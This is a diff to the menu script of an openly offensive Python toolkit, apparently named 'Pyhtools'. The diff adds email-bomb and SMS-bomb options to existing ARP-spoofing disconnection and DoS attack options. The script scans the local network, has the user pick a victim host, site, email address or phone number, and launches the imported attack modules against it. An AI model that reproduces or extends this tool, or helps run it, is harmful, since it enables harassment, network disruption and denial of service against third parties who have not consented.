@@ -1,6 +1,9 @@
 from modulesTools import dos, arp
+from modulesTools.emailBomb import EmBomb
+from modulesTools.smsBomb import SmsBomber
 import os,  sys, time
 import threading
+
 
 Green = '\033[92m'
 Blue = '\033[94m'
@@ -24,11 +27,14 @@ ______ ___.__.|  |___/  |_  ____   ____ |  |   ______
 
 
 def choice():
-    print(Yellow + 'Choice Menu:' + Grey)
+    print(Yellow + 'Choice Menu:\n' + Grey)
     print('     1. ARP disconnection')
     print('     2. DoS attack')
-    print('     3. Exit\n')
+    print('     3. Email bomb')
+    print('     4. SmS bomb')
+    print('\n     E. Exit\n')
 
+# 扫描动画
 def scanningAnimation(text):
     try:
         global stopAnimation
@@ -47,70 +53,120 @@ def scanningAnimation(text):
         os._exit(1)
 
 
+# e.g. Pyhtool>
 def header(name):
     return '{}{}{}> {}'.format(Blue, name, White, Grey)
 
 
 def shutdown():
-    print(Green + '[!] Thank you for your use!' + Grey)
+    print(Green + '\n[!] Thank you for your use!' + Grey)
+
+
+def ValidInput():
+    print(Red + '[!] Valid Input!' + Grey)
 
 
 if __name__ == '__main__':
-    banner()
-    choice()
 
-    c = input(header('Pyhtools'))
-
-    if c == '1':
+    while True:
         os.system('cls || clear')
-        global stopAnimation
-        stopAnimation  = False
-        t = threading.Thread(target=scanningAnimation, args=('Scanning your network, hang on...',))
-        t.daemon = True
-        t.start()
+        banner()
+        choice()
 
         try:
-            hostlist = arp.onlineIp()
-        except KeyboardInterrupt:
-            shutdown()
-        
-        stopAnimation = True
+            c = input(header('Pyhtools'))
+            if c == '1':
+                global stopAnimation
+                stopAnimation  = False
+                t = threading.Thread(target=scanningAnimation, args=('Scanning your network, hang on...',))
+                t.daemon = True
+                t.start()
 
-        os.system('cls || clear')
-        print(Green + 'OnLineIp: ' + Grey + '\n')
-        for i in range(len(hostlist)):
-            print('     [{}{}{}]: {}\t\t{}'.format(Yellow,i, Grey, hostlist[i][0], hostlist[i][1]))
-        
-        try:
-            target = int(input('\n' + header('ArpAttack')))
-            pkt = int(input('\n' + header('ArpAttack pkt'))) # 每秒发送的包
+                try:
+                    hostlist = arp.onlineIp()
+                except KeyboardInterrupt:
+                    shutdown()
+                
+                stopAnimation = True
 
-            _, my_mac = arp.getMyIp_Mac()
-            gateway_ip, _ = arp.getGateWayIp_Mac()
-            target_ip, target_mac = hostlist[target][0], hostlist[target][1]
+                print('\n')
+                print(Green + 'OnLineIp: ' + Grey + '\n')
+                for i in range(len(hostlist)):
+                    print('     [{}{}{}]: {}\t\t{}'.format(Yellow, i, Grey, hostlist[i][0], hostlist[i][1]))
+                
+                try:
+                    target = int(input('\n' + header('ArpAttack')))
+                    pkt = int(input('\n' + header('ArpAttack pkt'))) # 每秒发送的包
 
-            print(Green + 'Spoofing started...' + Grey)
+                    _, my_mac = arp.getMyIp_Mac()
+                    gateway_ip, _ = arp.getGateWayIp_Mac()
+                    target_ip, target_mac = hostlist[target][0], hostlist[target][1]
 
-            arp.arpAttack(my_mac, gateway_ip, target_ip, target_mac, pkt)
+                    print(Green + 'Spoofing started...' + Grey)
+
+                    arp.arpAttack(my_mac, gateway_ip, target_ip, target_mac, pkt)
+
+                except KeyboardInterrupt:
+                    sys.stdout.write(Red + '[!] Keyboard Interrupt !' + Grey)
+                    time.sleep(1)
+
+                except (ValueError, IndexError):
+                    sys.stdout.write(Red + '[!] valid input, exit !' + Grey)
+                    time.sleep(1)
+
+            elif c == '2':
+                site = input(header('Site'))
+                DosAttack = dos.DOS(site)
+                try:
+                    DosAttack.start_attack()
+                except KeyboardInterrupt:
+                    sys.stdout.write(Red + '[!] Keyboard Interrupt !' + Grey)
+                    time.sleep(1)
+
+            elif c == '3':
+                # To, Subject='Hello', Content='Are you ok?'
+                flag = True
+                while flag:
+                    try:
+                        To = input(header('To(e.g. 123@qq.com)'))
+                        Subject = input(header('Subject(e.g. Hello)'))
+                        Content = input(header('Content(e.g. Are you ok?'))
+                        number = int(input(header('e.g. 10')))
+                        EmBomb(To, Subject, Content).emAttack(number)  
+                        flag = False          
+                    except ValueError:
+                        sys.stdout.write(Red + 'Error!\n' + Grey)
+                        time.sleep(1)
+                        banner()
+                        choice()
+                        sys.stdout.write(Yellow + 'Email bomb:\n' + Grey)
+                    except KeyboardInterrupt:
+                        flag = False
+                        sys.stdout.write(Red + '[!] Keyboard Interrupt !' + Grey)
+                        time.sleep(1)
+                        
+                        
+
+            elif c == '4':
+                try:
+                    phone = input(header('PhoneNumber'))
+                    SmsBomber(phone).send()
+                except KeyboardInterrupt:
+                    sys.stdout.write(Red + '[!] Keyboard Interrupt!' + Grey)
+                    time.sleep(1)
+                except:
+                    sys.stdout.write(Red + '[!] Valid Input!' + Grey)
+                    time.sleep(1)
+                
+
+            elif c.lower() == 'e':
+                shutdown()
+                os._exit(0)
+            
+            else:
+                sys.stdout.write(Red + '[!] Valid Input!' + Grey)
+                time.sleep(1)
 
         except KeyboardInterrupt:
             shutdown()
             os._exit(0)
-
-        except ValueError or IndexError:
-            sys.exit(Red + '[!] valid input, exit !' + Grey)
-
-
-    elif c == '2':
-        os.system('cls || clear')
-        site = input(header('Site'))
-        DosAttack = dos.DOS(site)
-        try:
-            DosAttack.start_attack()
-        except KeyboardInterrupt:
-            shutdown()
-            os._exit(0)
-    
-    elif c == '3':
-        shutdown()
-        os._exit(0)
